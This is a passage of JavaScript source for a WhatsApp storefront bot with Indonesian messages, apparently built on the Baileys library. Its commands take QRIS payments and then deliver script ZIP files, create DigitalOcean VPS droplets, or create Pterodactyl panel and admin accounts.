    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
			
case "buyscript": case "buysc": {
if (m.isGroup) return m.reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Simple Bot V5', 
                  description: "Rp35.000", 
                  id: `${prefix}buysc 1`
                },
                {
                  title: 'Simple Bot V4', 
                  description: "Rp30.000", 
                  id: `${prefix}buysc 2`
                },
                {
                  title: 'Pushkontak Simpel', 
                  description: "Rp25.000", 
                  id: `${prefix}buysc 3`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V5"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "30000"
    Obj.namaSc = "Script Simple Bot V4"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "25000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 2 & Cpu 2', 
                  description: "Rp30.000 ✅", 
                  id: `${prefix}buyvps 1`
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000 ✅", 
                  id: `${prefix}buyvps 2`
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000 ✅", 
                  id: `${prefix}buyvps 3`
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Penting : Sebelum Membeli Vps Silahkan Ketik cekvps Untuk Mengecek Apakah Vps Ready\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-2vcpu-2gb"
    Obj.harga = "30000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "70000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

        
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

           
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;
            messageText += `Hubungi Owner Jika Ingin Di Instalkan Panel Pterodactyl Dengan Cara Ketik owner`;

            await conn.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp10.000", 
                  id: `${prefix}buypanel unlimited`
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: `${prefix}buypanel 1gb`
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: `${prefix}buypanel 2gb`
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: `${prefix}buypanel 3gb`
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: `${prefix}buypanel 4gb`
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: `${prefix}buypanel 5
                  gb`
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: `${prefix}buypanel 6gb`
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: `${prefix}buypanel 7gb`
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: `${prefix}buypanel 8gb`
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: `${prefix}buypanel 9gb`
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: `${prefix}buypanel 10gb`
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1500"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2500"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "3500"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "4500"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "5500"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "6500"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "7500"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "8500"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "9500"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "10000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await conn.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdroplet': {
  if (!isCreator) return Reply(mess.owner)
  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + global.apiDigitalOcean
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (err) {
        m.reply('Error fetching droplets: ' + err);
        return [];
      }
    };
    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;
      if (droplets.length === 0) {
        mesej += 'Tidak ada droplet yang tersedia!';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
          mesej += `• ID: ${droplet.id}
- Hostname: ${droplet.name}
- Status: ${droplet.status}
- Lokasi: ${droplet.region.name}
- IP: ${ipAddress}
- OS: ${droplet.image.distribution} (${droplet.image.name})
- RAM: ${droplet.memory} MB
- CPU: ${droplet.vcpus} vCPU
- Disk: ${droplet.disk} GB
- Size Slug: ${droplet.size_slug}
- Created: ${droplet.created_at}

`;
        });
      }
      conn.sendMessage(m.chat, { text: mesej }, { quoted: m });
    });
  } catch (err) {
    m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break 
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekvps": {
async function getDropletInfo() {
try {
const axios = require('axios');
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});
const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Vps Yang Bisa Di Beli Sisa : ${dropletInfo.remainingDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const axios = require('axios');
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

